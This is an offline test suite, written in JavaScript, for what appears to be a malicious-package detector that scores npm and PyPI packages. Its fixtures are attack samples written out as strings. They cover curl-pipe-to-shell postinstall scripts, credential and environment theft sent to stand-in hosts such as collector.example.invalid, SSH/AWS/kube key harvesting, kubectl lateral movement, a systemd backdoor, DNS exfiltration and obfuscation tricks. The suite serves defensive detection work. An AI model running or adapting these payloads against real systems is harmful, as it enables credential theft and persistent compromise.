import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { inspectJS, inspectPython } from '../src/analysis/ast-inspector.js';
import { analyzePackage } from '../src/analysis/signals.js';
import { detectTyposquat } from '../src/analysis/dep-graph.js';
import { buildProfile, diffProfiles } from '../src/analysis/behavioral.js';
import { POPULAR_NPM, POPULAR_PYPI } from '../src/core/allowlists.js';
import { NPM_REGISTRY_URL } from '../src/core/constants.js';

// ─── Hermetic network guard ────────────────────────────────────────────
// The file header CLAIMS "no network calls" — this makes it true. The only
// outbound path is dep-graph's profileDependency() hitting the npm registry
// for newly-added deps (via analyzePackage → analyzeNewDeps). We stub fetch to
// return 404 for those (so the fake malicious deps resolve to "unknown",
// exactly as offline), record every call, and hard-fail on any other host so a
// future real network call can't sneak back in.
let originalFetch;
const fetchCalls = [];

before(() => {
  originalFetch = global.fetch;
  global.fetch = async (url) => {
    const u = String(url);
    fetchCalls.push(u);
    if (u.startsWith(NPM_REGISTRY_URL)) {
      return {
        ok: false,
        status: 404,
        async json() { return {}; },
        async text() { return 'Not Found'; },
      };
    }
    throw new Error(`RED TEAM tests must be hermetic — unexpected network call to ${u}`);
  };
});

after(() => {
  global.fetch = originalFetch;
  // Every recorded call must have been to the mocked registry endpoint; no
  // call ever left the process.
  for (const u of fetchCalls) {
    assert.ok(u.startsWith(NPM_REGISTRY_URL),
      `red-team suite made a non-registry network call: ${u}`);
  }
});

/**
 * OFFLINE TECHNIQUE-FIXTURE SUITE
 *
 * Repository-authored metadata and source strings exercise selected signals.
 * No network calls or package execution occur. Package, person, path, and host
 * names are synthetic. These are not copies or faithful reconstructions of
 * historical malware, and passing them proves nothing about live-attack recall.
 */

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 1: publisher change + newly added downloader-shaped dependency.
// Names and dates are synthetic test labels, not incident attribution.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: publisher change and new downloader-shaped dependency', () => {
  // The injected clock keeps time-decay assertions stable forever.
  // NEVER assert on time-decayed severities without injecting `now` — a
  // wall-clock default turns the fixture into a time bomb.
  const AS_OF = new Date('2026-03-31T00:00:00Z').getTime();

  // Synthetic metadata combining several independent review signals.
  const publisherChangeMetadata = {
    name: 'fixture-http-client',
    latestVersion: '3.4.1',
    previousVersion: '3.4.0',
    maintainers: [{ name: 'fixture-new-publisher' }],
    latestPublisher: 'fixture-new-publisher',
    previousPublisher: 'fixture-original-publisher',
    maintainerChanged: true,
    hasInstallScripts: false,
    installScripts: {},
    scripts: {},
    dependencies: ['fixture-transport', 'fixture-form-data', 'fixture-proxy', 'fixture-downloader'],
    addedDeps: ['fixture-downloader'],
    removedDeps: [],
    latestPublishTime: new Date('2026-03-30T10:39:00Z'),
    previousPublishTime: new Date('2026-03-15T12:00:00Z'),
    publishIntervalMs: 15 * 24 * 60 * 60 * 1000,
    packageAgeMs: 10 * 365 * 24 * 60 * 60 * 1000, // 10 years old
    majorJump: 0,
    dormancyMs: null,
    versionCount: 150,
    repository: 'https://example.invalid/fixture-http-client',
    license: 'MIT',
  };

  // Repository-authored downloader/execution/self-delete pattern string.
  const downloaderPostinstall = `
    const https = require('https');
    const { execSync } = require('child_process');
    const fs = require('fs');
    const os = require('os');

    const platform = os.platform();
    const url = 'https://collector.example.invalid/payload/' + platform;

    https.get(url, (res) => {
      const path = '/tmp/.update-' + Math.random().toString(36);
      const file = fs.createWriteStream(path);
      res.pipe(file);
      file.on('finish', () => {
        execSync('chmod +x ' + path + ' && ' + path);
        fs.unlinkSync(path);
        fs.unlinkSync(__filename);
      });
    });
  `;

  it('Layer 4: detects maintainer account change', async () => {
    const result = await analyzePackage(publisherChangeMetadata, null, { ecosystem: 'npm', now: AS_OF });
    const maintainerSignal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
    assert.ok(maintainerSignal, 'MAINTAINER_CHANGE must be detected');
    assert.equal(maintainerSignal.severity, 'CRITICAL');
  });

  it('Layer 2: detects a newly added synthetic dependency', async () => {
    // The dependency-profile path is mocked offline. This assertion only
    // checks that the provided added-dependency metadata remains visible.
    const result = await analyzePackage(publisherChangeMetadata, null, { ecosystem: 'npm', now: AS_OF });
    const depSignals = result.signals.filter(s =>
      s.signal === 'PHANTOM_DEPENDENCY' || s.signal === 'NEW_DEPENDENCY' ||
      s.signal === 'CIRCULAR_STAGING' || s.signal === 'NEW_DEP_HAS_INSTALL_SCRIPTS'
    );
    assert.ok(depSignals.length > 0, 'new dependency must be flagged');
  });

  it('Layer 1: AST detects selected downloader-shaped postinstall patterns', () => {
    const result = inspectJS(downloaderPostinstall, 'fixture-downloader/postinstall');
    assert.ok(result.capabilities.spawnsProcess, 'must detect child_process.execSync');
    assert.ok(result.capabilities.accessesNetwork, 'must detect https.get network call');
    assert.ok(result.capabilities.selfDeletes, 'must detect fs.unlinkSync(__filename)');
    assert.ok(result.capabilities.writesFilesystem, 'must detect fs.createWriteStream');
    assert.ok(result.findingCount >= 4, `expected 4+ findings, got ${result.findingCount}`);
  });

  it('composite risk score is CRITICAL or HIGH', async () => {
    const result = await analyzePackage(publisherChangeMetadata, null, { ecosystem: 'npm', now: AS_OF });
    assert.ok(result.riskScore >= 15, `risk score ${result.riskScore} should be >= 15 (HIGH threshold)`);
    assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
      `risk level ${result.riskLevel} must be CRITICAL or HIGH`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 2: rapid publish + install hook + environment/network/process patterns.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: rapid publish and self-propagation-shaped strings', () => {
  const rapidPublishMetadata = {
    name: 'fixture-format-helper',
    latestVersion: '5.6.1-test',
    previousVersion: '5.6.0',
    maintainers: [{ name: 'fixture-publisher' }],
    latestPublisher: 'fixture-publisher',
    previousPublisher: 'fixture-publisher',
    maintainerChanged: false,
    hasInstallScripts: true,
    installScripts: {
      postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://payload.example.invalid/w|sh\')"',
    },
    scripts: { postinstall: 'node -e "require(\'child_process\').execSync(\'curl https://payload.example.invalid/w|sh\')"' },
    dependencies: [],
    addedDeps: [],
    removedDeps: [],
    latestPublishTime: new Date('2025-09-08T14:30:00Z'),
    previousPublishTime: new Date('2025-09-08T14:28:00Z'),
    publishIntervalMs: 2 * 60 * 1000, // 2 minutes apart — rapid publish
    packageAgeMs: 8 * 365 * 24 * 60 * 60 * 1000,
    majorJump: 0,
    dormancyMs: null,
    versionCount: 100,
    repository: 'https://example.invalid/fixture-format-helper',
    license: 'MIT',
  };

  // Repository-authored environment/network/process/self-delete pattern string.
  const propagationShapedPayload = `
    const { execSync } = require('child_process');
    const https = require('https');
    const fs = require('fs');

    // Environment collection pattern.
    const envDump = JSON.stringify(process.env);
    https.request({
      hostname: 'collector.example.invalid',
      path: '/exfil',
      method: 'POST',
      headers: { 'Content-Type': 'application/json' }
    }, () => {}).end(envDump);

    // Package-manager credential/use pattern.
    const npmToken = process.env.NPM_TOKEN;
    if (npmToken) {
      execSync('npm whoami --registry https://registry.npmjs.org/');
    }

    // Self-delete pattern.
    fs.unlinkSync(__filename);
  `;

  it('Layer 4: detects rapid publish (2 minutes between versions)', async () => {
    const result = await analyzePackage(rapidPublishMetadata, null, { ecosystem: 'npm' });
    const rapidSignal = result.signals.find(s => s.signal === 'RAPID_PUBLISH');
    assert.ok(rapidSignal, 'RAPID_PUBLISH must be detected');
    assert.equal(rapidSignal.severity, 'HIGH');
  });

  it('Layer 4: detects a newly supplied postinstall script', async () => {
    const result = await analyzePackage(rapidPublishMetadata, null, { ecosystem: 'npm' });
    const postinstallSignal = result.signals.find(s => s.signal === 'POSTINSTALL_SCRIPT');
    assert.ok(postinstallSignal, 'POSTINSTALL_SCRIPT must be detected');
  });

  it('Layer 1: AST detects the selected capability string', () => {
    const result = inspectJS(propagationShapedPayload, 'fixture-format-helper/capabilities.js');
    assert.ok(result.capabilities.spawnsProcess, 'must detect execSync');
    assert.ok(result.capabilities.accessesNetwork, 'must detect https.request');
    assert.ok(result.capabilities.readsCredentials, 'must detect NPM_TOKEN access');
    assert.ok(result.capabilities.selfDeletes, 'must detect self-deletion');
  });

  it('Layer 1: AST detects the node -e postinstall payload', () => {
    // The postinstall is: node -e "require('child_process').execSync('curl ...')"
    // extractInlineJS should pull the JS out of the node -e wrapper
    const scriptBody = rapidPublishMetadata.installScripts.postinstall;

    // Simulate what extractInlineJS does
    const match = scriptBody.match(/^node\s+(?:-e|--eval)\s+['"](.+)['"]\s*$/);
    assert.ok(match, 'extractInlineJS should match the node -e pattern');

    const jsPayload = match[1];
    const result = inspectJS(jsPayload, 'fixture-format-helper/postinstall-extracted');
    assert.ok(result.capabilities.spawnsProcess,
      'must detect execSync inside node -e payload');
  });

  it('Layer 3: detects a synthetic process-spawn capability escalation', () => {
    // Previous fixture profile: no capabilities.
    const prevProfile = {
      capabilities: [],
      hasInstallScripts: false,
      dependencyCount: 0,
      maintainerCount: 1,
      hasRepository: true,
    };

    // Current fixture profile: process, network, credential, and delete capabilities.
    const currProfile = {
      capabilities: ['process_spawn', 'network', 'credential_access', 'self_deletion'],
      hasInstallScripts: true,
      dependencyCount: 0,
      maintainerCount: 1,
      hasRepository: true,
    };

    const findings = diffProfiles(currProfile, prevProfile);
    const escalations = findings.filter(f => f.signal === 'CAPABILITY_ESCALATION');
    assert.ok(escalations.length >= 3,
      `expected 3+ capability escalations, got ${escalations.length}: ${escalations.map(e => e.evidence.capability)}`);
    assert.ok(escalations.some(e => e.evidence.capability === 'process_spawn'));
    assert.ok(escalations.some(e => e.evidence.capability === 'network'));
    assert.ok(escalations.some(e => e.evidence.capability === 'credential_access'));
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 3: older publisher transfer + new dependency + encoded execution string.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: publisher transfer and encoded execution string', () => {
  const publisherTransferMetadata = {
    name: 'fixture-stream-helper',
    latestVersion: '3.3.6',
    previousVersion: '3.3.5',
    maintainers: [{ name: 'fixture-new-owner' }],
    latestPublisher: 'fixture-new-owner',
    previousPublisher: 'fixture-original-owner',
    maintainerChanged: true,
    hasInstallScripts: false,
    installScripts: {},
    scripts: {},
    dependencies: ['fixture-through', 'fixture-from', 'fixture-map', 'fixture-pause', 'fixture-split', 'fixture-flatmap'],
    addedDeps: ['fixture-flatmap'],
    removedDeps: [],
    latestPublishTime: new Date('2018-09-16T00:00:00Z'),
    previousPublishTime: new Date('2018-04-01T00:00:00Z'),
    publishIntervalMs: 168 * 24 * 60 * 60 * 1000, // ~5 months
    packageAgeMs: 6 * 365 * 24 * 60 * 60 * 1000,
    majorJump: 0,
    dormancyMs: 400 * 24 * 60 * 60 * 1000,
    versionCount: 30,
    repository: 'https://example.invalid/fixture-stream-helper',
    license: 'MIT',
  };

  // Repository-authored base64 + dynamic-function pattern string.
  const encodedExecutionPayload = `
    var Stream = require('stream').Transform;
    var crypto = require('crypto');

    // Encoded input passed to a dynamic function in this synthetic string.
    var encoded = 'dGVzdCBwYXlsb2Fk'; // base64 encoded
    var decoded = Buffer.from(encoded, 'base64').toString();
    var fn = new Function('module', 'exports', decoded);
    fn(module, module.exports);
  `;

  it('Layer 4: detects the synthetic maintainer change', async () => {
    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
    const signal = result.signals.find(s => s.signal === 'MAINTAINER_CHANGE');
    assert.ok(signal, 'MAINTAINER_CHANGE must be detected');
    // The pinned old date exercises the time-decay path.
    assert.ok(signal.severity === 'CRITICAL' || signal.severity === 'MODERATE',
      `severity should be CRITICAL or MODERATE, got ${signal.severity}`);
  });

  it('Layer 2: detects the synthetic new dependency', async () => {
    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
    const depSignals = result.signals.filter(s =>
      s.signal.includes('DEPENDENCY') || s.signal === 'PHANTOM_DEPENDENCY'
    );
    assert.ok(depSignals.length > 0, 'new dependency must trigger a signal');
  });

  it('Layer 1: AST detects encoded input passed to dynamic execution', () => {
    const result = inspectJS(encodedExecutionPayload, 'fixture-flatmap/index.js');
    assert.ok(result.capabilities.decodesPayloads, 'must detect Buffer.from base64');
    assert.ok(result.capabilities.executesCode, 'must detect new Function()');
  });

  it('Layer 4: detects dormancy pattern (13 months then sudden publish)', async () => {
    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
    const dormancySignal = result.signals.find(s => s.signal === 'VERSION_ANOMALY');
    assert.ok(dormancySignal, 'VERSION_ANOMALY (dormancy) must be detected');
  });

  it('composite score is HIGH or CRITICAL', async () => {
    const result = await analyzePackage(publisherTransferMetadata, null, { ecosystem: 'npm' });
    assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
      `risk level ${result.riskLevel} must be CRITICAL or HIGH`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 4: cross-platform process, network, and environment access string.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: process/network/environment access', () => {
  const crossPlatformPostinstall = `
    const { exec } = require('child_process');
    const os = require('os');

    if (os.platform() === 'linux') {
      exec('curl -fsSL https://payload.example.invalid/linux.sh | bash');
    } else if (os.platform() === 'win32') {
      exec('powershell -Command "Invoke-WebRequest -Uri https://payload.example.invalid/windows.exe -OutFile %TEMP%/fixture.exe; Start-Process %TEMP%/fixture.exe"');
    }

    // Steal credentials
    const secrets = {
      npm: process.env.NPM_TOKEN,
      github: process.env.GITHUB_TOKEN,
      aws_key: process.env.AWS_ACCESS_KEY_ID,
      aws_secret: process.env.AWS_SECRET_ACCESS_KEY,
    };

    const https = require('https');
    const data = JSON.stringify(secrets);
    https.request({ hostname: 'collector.example.invalid', path: '/submit', method: 'POST' }, () => {}).end(data);
  `;

  it('Layer 1: detects the selected patterns in the synthetic string', () => {
    const result = inspectJS(crossPlatformPostinstall, 'fixture-platform-helper/postinstall');

    // Assert only the capabilities intentionally represented by this fixture.
    assert.ok(result.capabilities.spawnsProcess, 'must detect exec()');
    assert.ok(result.capabilities.accessesNetwork, 'must detect https.request');
    assert.ok(result.capabilities.readsCredentials, 'must detect NPM_TOKEN + AWS credentials');

    // Verify specific credential detection
    const envFindings = result.findings.filter(f => f.pattern === 'ENV_HARVESTING');
    assert.ok(envFindings.length >= 3,
      `must detect 3+ credential accesses, got ${envFindings.length}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 5: selected typosquat spellings.
//
// Generic typosquat scenario — a package with name similar to a popular
// package, brand new, single maintainer, contains malicious payload.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: selected typosquat spellings', () => {
  it('detects common typosquats of popular packages', () => {
    const typosquats = [
      ['expresss', 'express'],    // extra letter
      ['requets', 'requests'],    // missing letter (PyPI)
      ['loadash', 'lodash'],      // character swap
    ];

    for (const [typo, target] of typosquats) {
      const popularSet = target === 'requests' ? POPULAR_PYPI : POPULAR_NPM;
      const matches = detectTyposquat(typo, popularSet);
      assert.ok(matches.some(m => m.similar === target),
        `"${typo}" must be detected as typosquat of "${target}"`);
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 6: Python process/network/encoding/self-delete patterns.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: Python process/network/encoding patterns', () => {
  const pythonCapabilityFixture = `
import subprocess
import os
import base64
import urllib.request

# Stage 1: Harvest credentials
env_data = str(os.environ)
encoded = base64.b64encode(env_data.encode()).decode()

# Stage 2: Exfiltrate
urllib.request.urlopen('https://collector.example.invalid/collect?d=' + encoded)

# Stage 3: Deploy persistent backdoor
subprocess.Popen(
    ['bash', '-c', 'curl https://payload.example.invalid/setup.sh | bash'],
    stdout=subprocess.DEVNULL
)

# Stage 4: Cleanup
os.remove(__file__)
  `;

  it('Python inspector detects the selected synthetic patterns', () => {
    const result = inspectPython(pythonCapabilityFixture, 'fixture-python/setup.py');

    assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.Popen');
    assert.ok(result.capabilities.accessesNetwork, 'must detect urllib.request.urlopen');
    assert.ok(result.capabilities.decodesPayloads, 'must detect base64.b64encode');
    assert.ok(result.findingCount >= 3, `expected 3+ findings, got ${result.findingCount}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 7: three repository-authored Python strings for credential access,
// orchestration commands, system-path writes, persistence, and cleanup.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: staged Python capability strings', () => {
  const pythonStage1 = `
import os
import subprocess
import base64
import json

# Stage 1: Credential harvesting
targets = {
    'ssh_keys': os.path.expanduser('~/.ssh/'),
    'aws_creds': os.path.expanduser('~/.aws/credentials'),
    'kube_config': os.path.expanduser('~/.kube/config'),
    'gcloud_creds': os.path.expanduser('~/.config/gcloud/'),
    'env_files': ['.env', '.env.local', '.env.production'],
}

stolen = {}
for name, path in targets.items():
    if isinstance(path, list):
        for p in path:
            if os.path.exists(p):
                stolen[p] = open(p).read()
    elif os.path.isdir(path):
        for f in os.listdir(path):
            fp = os.path.join(path, f)
            if os.path.isfile(fp):
                stolen[fp] = open(fp).read()
    elif os.path.isfile(path):
        stolen[path] = open(path).read()

# Also grab all env vars
stolen['env'] = dict(os.environ)

# Exfiltrate via HTTPS
encoded = base64.b64encode(json.dumps(stolen).encode()).decode()
subprocess.run(['curl', '-X', 'POST', '-d', encoded, 'https://collector.example.invalid/collect'], capture_output=True)
  `;

  const pythonStage2 = `
import subprocess
import os

# Stage 2: Kubernetes lateral movement
# Deploy privileged pod to every node to spread
if os.path.exists(os.path.expanduser('~/.kube/config')):
    nodes = subprocess.check_output(['kubectl', 'get', 'nodes', '-o', 'name']).decode().strip().split('\\n')
    for node in nodes:
        subprocess.run([
            'kubectl', 'run', 'kube-health-' + node.split('/')[-1],
            '--image=alpine', '--privileged',
            '--overrides={"spec":{"nodeName":"' + node.split('/')[-1] + '"}}',
            '--command', '--', 'sh', '-c',
            'wget -q https://payload.example.invalid/cluster-agent -O /tmp/.k && chmod +x /tmp/.k && /tmp/.k'
        ])
  `;

  const pythonStage3 = `
import subprocess
import os

# Stage 3: Persistent systemd backdoor
service = \"\"\"[Unit]
Description=System Health Monitor
After=network.target
[Service]
ExecStart=/usr/local/bin/.health-monitor
Restart=always
[Install]
WantedBy=multi-user.target\"\"\"

# Install backdoor binary
subprocess.run(['curl', '-o', '/usr/local/bin/.health-monitor', 'https://payload.example.invalid/persist'])
subprocess.run(['chmod', '+x', '/usr/local/bin/.health-monitor'])

# Install systemd service
with open('/etc/systemd/system/health-monitor.service', 'w') as f:
    f.write(service)

subprocess.run(['systemctl', 'daemon-reload'])
subprocess.run(['systemctl', 'enable', 'health-monitor'])
subprocess.run(['systemctl', 'start', 'health-monitor'])

# Cleanup - erase evidence
os.remove(__file__)
  `;

  it('Python inspector detects Stage 1: credential harvesting', () => {
    const result = inspectPython(pythonStage1, 'fixture-python/stage1.py');
    assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.run for exfil');
    assert.ok(result.capabilities.decodesPayloads, 'must detect base64.b64encode');
    assert.ok(result.capabilities.readsCredentials || result.findings.some(f => f.pattern === 'ENV_HARVESTING'),
      'must detect os.environ access');
    assert.ok(result.findingCount >= 2, `expected 2+ findings, got ${result.findingCount}`);
  });

  it('Python inspector detects Stage 2: K8s lateral movement', () => {
    const result = inspectPython(pythonStage2, 'fixture-python/stage2.py');
    assert.ok(result.capabilities.spawnsProcess,
      'must detect subprocess.check_output and subprocess.run');
    const spawnFindings = result.findings.filter(f => f.pattern === 'PROCESS_SPAWN');
    assert.ok(spawnFindings.length >= 2,
      `must detect multiple subprocess calls, got ${spawnFindings.length}`);
  });

  it('Python inspector detects Stage 3: persistent backdoor + cleanup', () => {
    const result = inspectPython(pythonStage3, 'fixture-python/stage3.py');
    assert.ok(result.capabilities.spawnsProcess, 'must detect subprocess.run for systemd install');
    assert.ok(result.capabilities.writesSystemPaths || result.findings.some(f => f.pattern === 'SYSTEM_PATH_WRITE'),
      'must detect writes to /usr/local/bin and /etc/systemd');
    const spawnFindings = result.findings.filter(f => f.pattern === 'PROCESS_SPAWN');
    assert.ok(spawnFindings.length >= 4,
      `must detect 4+ subprocess calls (curl, chmod, systemctl x3), got ${spawnFindings.length}`);
  });

  it('all 3 stages combined reach CRITICAL detection', () => {
    const allCode = pythonStage1 + '\n' + pythonStage2 + '\n' + pythonStage3;
    const result = inspectPython(allCode, 'fixture-python/combined-capabilities.py');

    assert.ok(result.capabilities.spawnsProcess, 'subprocess detected');
    assert.ok(result.capabilities.decodesPayloads, 'base64 detected');
    assert.equal(result.maxSeverity, 'CRITICAL',
      `max severity should be CRITICAL, got ${result.maxSeverity}`);
    assert.ok(result.findingCount >= 8,
      `expected 8+ total findings across all stages, got ${result.findingCount}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 8: selected obfuscation/evasion-shaped syntax.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: selected evasion-shaped syntax', () => {
  it('detects string concatenation in require (evasion)', () => {
    const code = 'require("child" + "_process").exec("cmd");';
    const result = inspectJS(code);
    assert.ok(result.findings.some(f => f.pattern === 'POSSIBLE_OBFUSCATION'),
      'string concatenation in require must be flagged');
  });

  it('detects process.binding escape hatch', () => {
    const code = 'process.binding("spawn_sync").spawn({ file: "sh", args: ["-c", "curl payload.example.invalid"] });';
    const result = inspectJS(code);
    assert.ok(result.capabilities.spawnsProcess, 'process.binding must be caught');
  });

  it('detects eval passed as callback (common in obfuscated malware)', () => {
    const code = `
      fetch('https://payload.example.invalid/payload.js')
        .then(r => r.text())
        .then(eval);
    `;
    const result = inspectJS(code);
    assert.ok(result.capabilities.executesCode, 'eval-as-callback must be caught');
    assert.ok(result.capabilities.accessesNetwork, 'fetch must be caught');
  });

  it('detects vm module code execution', () => {
    const code = `
      const { runInNewContext } = require('vm');
      const payload = Buffer.from('cHJvY2Vzcy5leGl0KCk=', 'base64').toString();
      runInNewContext(payload);
    `;
    const result = inspectJS(code);
    assert.ok(result.capabilities.executesCode, 'vm.runInNewContext must be caught');
    assert.ok(result.capabilities.decodesPayloads, 'base64 decode must be caught');
  });

  it('detects process.dlopen native module loading', () => {
    const code = 'process.dlopen(module, "./malicious.node");';
    const result = inspectJS(code);
    assert.ok(result.findings.some(f => f.pattern === 'CODE_EXECUTION'),
      'process.dlopen must be caught');
  });

  it('detects Python line continuation evasion', () => {
    // Attacker splits the dangerous call across lines
    const code = 'subprocess' + String.fromCharCode(92) + '\n  .call("curl payload.example.invalid | sh", shell=True)';
    const result = inspectPython(code);
    assert.ok(result.capabilities.spawnsProcess,
      'Python line continuation must not evade detection');
  });
});

// ═══════════════════════════════════════════════════════════════════════
// FIXTURE 9: hypothetical capability-change and WebAssembly-loader strings.
// ═══════════════════════════════════════════════════════════════════════

describe('TECHNIQUE FIXTURE: hypothetical capability patterns', () => {
  it('catches a package that gains network+exec capabilities between versions', () => {
    // Previously safe utility package
    const prev = {
      capabilities: [],
      hasInstallScripts: false,
      dependencyCount: 2,
      maintainerCount: 3,
      hasRepository: true,
    };

    // Suddenly has dangerous capabilities
    const curr = {
      capabilities: ['process_spawn', 'network', 'credential_access'],
      hasInstallScripts: true,
      dependencyCount: 3,
      maintainerCount: 1, // Maintainer count dropped too
      hasRepository: true,
    };

    const findings = diffProfiles(curr, prev);
    assert.ok(findings.some(f => f.signal === 'CAPABILITY_ESCALATION'),
      'capability escalation must be detected in this fixture');
    assert.ok(findings.some(f => f.signal === 'MAINTAINER_REDUCTION'),
      'maintainer reduction should be flagged');
    assert.ok(findings.length >= 4,
      `expected 4+ signals in this fixture, got ${findings.length}`);
  });

  it('catches a WebAssembly-based payload (novel vector)', () => {
    // Hypothetical: malware compiles to WASM to evade JS analysis
    // But it still needs to be loaded via JS — we catch the loader
    const wasmLoader = `
      const fs = require('fs');
      const wasmBuffer = fs.readFileSync(__dirname + '/payload.wasm');
      const wasmModule = new WebAssembly.Module(wasmBuffer);
      const instance = new WebAssembly.Instance(wasmModule, {
        env: {
          exec: (ptr, len) => {
            const { execSync } = require('child_process');
            execSync(getString(ptr, len));
          }
        }
      });
    `;
    const result = inspectJS(wasmLoader, 'novel/wasm-loader.js');
    assert.ok(result.capabilities.spawnsProcess,
      'must catch child_process.execSync inside WASM import bridge');
  });

  it('catches DNS exfiltration pattern (novel vector)', () => {
    const dnsExfil = `
      const dns = require('dns');
      const os = require('os');
      const data = Buffer.from(JSON.stringify(process.env)).toString('base64');
      // Exfil via DNS TXT query (bypasses HTTP-based firewalls)
      const chunks = data.match(/.{1,63}/g);
      for (const chunk of chunks) {
        dns.resolveTxt(chunk + '.exfil.example.invalid', () => {});
      }
    `;
    const result = inspectJS(dnsExfil, 'novel/dns-exfil.js');
    // Should catch the base64 encoding and env access at minimum
    assert.ok(result.capabilities.decodesPayloads, 'must catch base64 encoding');
  });

  it('catches a package with suspicious combo: new maintainer + new dep + install scripts', async () => {
    const suspiciousMeta = {
      name: 'totally-safe-pkg',
      latestVersion: '2.0.0',
      previousVersion: '1.0.0',
      maintainers: [{ name: 'new-person' }],
      latestPublisher: 'new-person',
      previousPublisher: 'original-author',
      maintainerChanged: true,
      hasInstallScripts: true,
      installScripts: { postinstall: 'node setup.js' },
      scripts: { postinstall: 'node setup.js' },
      dependencies: ['helper-utils'],
      addedDeps: ['helper-utils'],
      removedDeps: [],
      latestPublishTime: new Date(),
      previousPublishTime: new Date(Date.now() - 365 * 24 * 60 * 60 * 1000),
      publishIntervalMs: 365 * 24 * 60 * 60 * 1000,
      packageAgeMs: 3 * 365 * 24 * 60 * 60 * 1000,
      majorJump: 1,
      dormancyMs: 400 * 24 * 60 * 60 * 1000, // ~13 months — clearly over 1 year threshold
      versionCount: 10,
      repository: null, // No repo link
      license: 'MIT',
    };

    const result = await analyzePackage(suspiciousMeta, null, { ecosystem: 'npm' });

    // This should trigger MULTIPLE signals: maintainer change + new dep + postinstall + dormancy + no repo
    assert.ok(result.signals.some(s => s.signal === 'MAINTAINER_CHANGE'), 'maintainer change');
    assert.ok(result.signals.some(s => s.signal === 'POSTINSTALL_SCRIPT'), 'postinstall');
    assert.ok(result.signals.some(s => s.signal === 'VERSION_ANOMALY'), 'dormancy');
    assert.ok(result.signals.some(s => s.signal === 'NO_REPOSITORY'), 'no repo');

    // The COMBINATION should push this to HIGH or CRITICAL
    assert.ok(result.riskLevel === 'CRITICAL' || result.riskLevel === 'HIGH',
      `multi-signal fixture should be HIGH/CRITICAL, got ${result.riskLevel} (score: ${result.riskScore})`);

    // Signal combination bonus should kick in (3+ unique signals = 1.5x multiplier)
    const uniqueSignals = new Set(result.signals.map(s => s.signal));
    assert.ok(uniqueSignals.size >= 4,
      `expected 4+ unique signal types, got ${uniqueSignals.size}: ${[...uniqueSignals].join(', ')}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// META: Selected benign controls (not a population false-positive estimate).
// ═══════════════════════════════════════════════════════════════════════

describe('SELECTED BENIGN CONTROLS', () => {
  it('does NOT flag legitimate esbuild postinstall', async () => {
    const esbuildMeta = {
      name: 'esbuild',
      latestVersion: '0.20.0',
      previousVersion: '0.19.12',
      maintainers: [{ name: 'evanw' }],
      latestPublisher: 'evanw',
      previousPublisher: 'evanw',
      maintainerChanged: false,
      hasInstallScripts: true,
      installScripts: { postinstall: 'node install.js' },
      scripts: { postinstall: 'node install.js' },
      dependencies: [],
      addedDeps: [],
      removedDeps: [],
      latestPublishTime: new Date('2024-01-15T00:00:00Z'),
      previousPublishTime: new Date('2024-01-10T00:00:00Z'),
      publishIntervalMs: 5 * 24 * 60 * 60 * 1000,
      packageAgeMs: 5 * 365 * 24 * 60 * 60 * 1000,
      majorJump: 0,
      dormancyMs: null,
      versionCount: 500,
      repository: 'https://github.com/evanw/esbuild',
      license: 'MIT',
    };

    const result = await analyzePackage(esbuildMeta, null, { ecosystem: 'npm' });
    // esbuild should be flagged for postinstall but at LOW severity (known good)
    const postinstallSignal = result.signals.find(s => s.signal === 'POSTINSTALL_SCRIPT');
    assert.ok(postinstallSignal, 'esbuild should still have postinstall signal');
    assert.equal(postinstallSignal.severity, 'LOW', 'known-good postinstall should be LOW');
    assert.ok(result.riskLevel !== 'CRITICAL',
      `esbuild risk level should NOT be CRITICAL, got ${result.riskLevel}`);
  });

  it('does NOT flag normal package updates', async () => {
    const normalMeta = {
      name: 'lodash',
      latestVersion: '4.17.22',
      previousVersion: '4.17.21',
      maintainers: [{ name: 'jdalton' }, { name: 'mathias' }],
      latestPublisher: 'jdalton',
      previousPublisher: 'jdalton',
      maintainerChanged: false,
      hasInstallScripts: false,
      installScripts: {},
      scripts: {},
      dependencies: [],
      addedDeps: [],
      removedDeps: [],
      latestPublishTime: new Date('2024-06-01T00:00:00Z'),
      previousPublishTime: new Date('2024-01-01T00:00:00Z'),
      publishIntervalMs: 150 * 24 * 60 * 60 * 1000,
      packageAgeMs: 12 * 365 * 24 * 60 * 60 * 1000,
      majorJump: 0,
      dormancyMs: null,
      versionCount: 200,
      repository: 'https://github.com/lodash/lodash',
      license: 'MIT',
    };

    const result = await analyzePackage(normalMeta, null, { ecosystem: 'npm' });
    assert.equal(result.riskLevel, 'NONE',
      `lodash should have NONE risk level, got ${result.riskLevel} with signals: ${result.signals.map(s => s.signal)}`);
  });
});

// ═══════════════════════════════════════════════════════════════════════
// META: MAINTAINER_CHANGE time-decay boundary
//
// Pins the 90-day cliff in signals.js so it can never silently move, and
// verifies the injected clock controls it (the wall clock must not).
// ═══════════════════════════════════════════════════════════════════════

